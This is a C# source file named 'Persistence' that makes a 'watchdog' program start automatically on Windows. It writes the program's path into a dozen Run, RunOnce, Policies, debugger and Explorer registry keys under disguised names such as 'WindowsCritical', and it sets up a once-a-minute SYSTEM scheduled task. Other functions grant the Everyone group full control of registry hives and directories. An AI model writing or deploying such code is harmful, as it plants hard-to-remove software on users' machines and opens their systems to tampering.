using System.Diagnostics;
using Microsoft.Win32;
using System.Security.AccessControl;
using System.Security.Principal;
using System.IO;


namespace Persistence
{
    public class Persistence
    {

        public static void runAllTechniques()
        {
            /*
             * The issue is that File.GetAccessControl and File.SetAccessControl are not available in all .NET frameworks. They are available in the full .NET Framework, but not in .NET Core or .NET 5+.


             * 
             */


            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "RunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); // Run Keys on startup
            //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServicesOnce", "WindowsRunOnSystemStartTask", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServices", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunServices", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
            //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
            //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);
            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
            SetRegistryKey(@"Software\Microsoft\Windows NT\CurrentVersion\WindowsLoad", "BootVerification", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRename", 1, RegistryHive.CurrentUser);
            //SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser);



            SetRegistryKey(@"Software\Microsoft\Windows NT\CurrentVersion\AeDebug\Debugger", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //relies on application crash
            SetRegistryKey(@"Software\Microsoft\Windows\Windows Error Reporting\Hangs\Debugger", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //relies on application crash

            //SetRegistryKey(@"Software\Microsoft\Command Processor\AutoRun", "WindowsCritical", Config.PrimaryWatchdogFullPath, RegistryHive.CurrentUser); //Runs when cmd.exe starts


            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "BackupPath", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine); //These three are Windows background processes
            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "cleanuppath", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);
            SetRegistryKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "DefragPath", Config.PrimaryWatchdogFullPath, RegistryHive.LocalMachine);


            string taskName = "WindowsDriveVerification";

            // Check if the task exists
            if (!TaskExistsAndActive(taskName))
            {
                // Create or re-enable the task if it doesn't exist or is inactive
                CreateScheduledTask(taskName, Config.PrimaryWatchdogFullPath, 1); // Runs every 1 minute
                Console.WriteLine($"Scheduled task '{taskName}' created or re-enabled successfully.");
            }
            else
            {
                Console.WriteLine($"Scheduled task '{taskName}' already exists and is active.");

            }

        }

        static bool TaskExistsAndActive(string taskName)
        {
            Process process = new Process();
            process.StartInfo.FileName = "schtasks";
            process.StartInfo.Arguments = $"/Query /TN \"{taskName}\" /V /FO LIST";
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            // Check if the task exists and is active
            return output.Contains(taskName) && output.Contains("Status: Ready");
        }

        // Function to create a scheduled task to run every 30 seconds
        static void CreateScheduledTask(string taskName, string binaryPath, int intervalSeconds)
        {
            // Create the schtasks command to run every 30 seconds
            string command = $"/Create /TN \"{taskName}\" /TR \"{binaryPath}\" /SC ONCE /ST 00:00 /F /RI {intervalSeconds} /DU 9999:59 /RU SYSTEM"; //sets system permissions

            Process process = new Process();
            process.StartInfo.FileName = "schtasks";
            process.StartInfo.Arguments = command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;

            process.Start();
            process.WaitForExit();
        }

        public static void SetRegistryKey(string keyPath, string valueName, object value, RegistryHive hive, RegistryView view = RegistryView.Default)
        {
            try
            {
                using (RegistryKey baseKey = RegistryKey.OpenBaseKey(hive, view))
                {
                    using (RegistryKey key = baseKey.OpenSubKey(keyPath, true) ?? baseKey.CreateSubKey(keyPath, true))
                    {
                        if (key != null)
                        {
                            object currentValue = key.GetValue(valueName);
                            if (currentValue == null || !currentValue.Equals(value))
                            {
                                key.SetValue(valueName, value);
                            }
                        }
                        else
                        {
                            throw new IOException($"Failed to create or open registry key: {keyPath}");
                        }
                    }
                }
            }
            catch (UnauthorizedAccessException ex)
            {
                LogError($"Access denied to registry key: {keyPath}. Exception: {ex.Message}");
            }
            catch (IOException ex)
            {
                LogError($"I/O error accessing registry key: {keyPath}. Exception: {ex.Message}");
            }
            catch (Exception ex)
            {
                LogError($"Unexpected error: {ex.Message}");
            }
        }

        private static void LogError(string message)
        {
            // Log to a file, event log, or other logging mechanism
            Console.WriteLine($"[ERROR] {message}");  // Example logging
        }

        public static void GrantEveryoneFullControl(string registryHive)
        {
            try
            {
                // Select the correct registry key (HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER)
                RegistryKey rootKey = registryHive.ToUpper() switch
                {
                    "HKLM" => Registry.LocalMachine,
                    "HKCU" => Registry.CurrentUser,
                    _ => throw new ArgumentException("Invalid registry hive specified. Use 'HKLM' or 'HKCU'.")
                };

                // Get the current access control for the key
                RegistrySecurity registrySecurity = rootKey.GetAccessControl();

                // Create a new rule that grants "Everyone" Full Control
                RegistryAccessRule rule = new RegistryAccessRule(
                    new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
                    RegistryRights.FullControl,                               // Full control
                    InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, // Inherit permissions
                    PropagationFlags.None,                                    // Don't propagate further
                    AccessControlType.Allow                                   // Allow the rule
                );

                // Add the rule to the security object
                registrySecurity.AddAccessRule(rule);

                // Enable inheritance for subkeys
                registrySecurity.SetAccessRuleProtection(false, false);

                // Apply the modified security settings to the key
                rootKey.SetAccessControl(registrySecurity);

                Console.WriteLine($"Successfully granted 'Everyone' full control and enabled inheritance on {registryHive}.");
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
            }
            catch (ArgumentException ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
        }

        public static void GrantEveryoneFullControlOnDirectory(string directoryPath) // applies full control to the directories and subdirectories
        {
            try
            {
                // Check if the directory exists
                if (!Directory.Exists(directoryPath))
                {
                    throw new DirectoryNotFoundException($"The specified directory does not exist: {directoryPath}");
                }

                // Get the current access control settings for the directory
                DirectoryInfo directoryInfo = new DirectoryInfo(directoryPath);
                DirectorySecurity directorySecurity = directoryInfo.GetAccessControl();

                // Create a new rule that grants "Everyone" full control, but only on directories (not files)
                FileSystemAccessRule rule = new FileSystemAccessRule(
                    new SecurityIdentifier(WellKnownSidType.WorldSid, null), // "Everyone" group
                    FileSystemRights.FullControl,                           // Full control
                    InheritanceFlags.ContainerInherit,                      // Inherit permissions only to subdirectories
                    PropagationFlags.None,                                  // Don't propagate to child objects
                    AccessControlType.Allow                                 // Allow the rule
                );

                // Add the rule to the directory security object
                directorySecurity.AddAccessRule(rule);

                // Apply the modified security settings to the directory
                directoryInfo.SetAccessControl(directorySecurity);

                Console.WriteLine($"Successfully granted 'Everyone' full control on the directory and subdirectories: {directoryPath}");
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.WriteLine("Error: Access denied. Run the application with administrator privileges.");
            }
            catch (DirectoryNotFoundException ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }
        }


     
    }
}